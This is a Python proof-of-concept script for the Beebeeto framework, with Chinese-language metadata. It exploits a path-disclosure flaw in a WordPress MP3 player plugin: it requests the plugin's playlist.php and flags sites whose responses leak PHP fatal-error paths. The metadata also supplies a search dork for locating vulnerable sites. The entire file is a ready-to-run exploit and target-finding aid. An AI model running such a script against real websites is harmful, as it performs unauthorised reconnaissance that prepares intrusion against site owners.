#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0166',
            'name': 'WordPress HTML 5 MP3 Player with Playlist 插件泄漏服务器物理路径 POC',
            'author': 'tmp',
            'create_date': '2014-11-27',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'WordPress',
            'vul_version': ['*'],
            'type': 'Information Disclosure',
            'tag': ['Wordpress插件漏洞', '爆物理路径漏洞', 'html5-mp3-player-with-playlist漏洞', 'php'],
            'desc': 'DORK: inurl:html5plus/html5full.php',
            'references': ['http://www.exploit-db.com/exploits/35388/',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        file_path = '/wp-content/plugins/html5-mp3-player-with-playlist/html5plus/playlist.php'
        verify_url = args['options']['target'] + file_path
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if '<b>Fatal error</b>:' in content and '</b> on line <b>' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())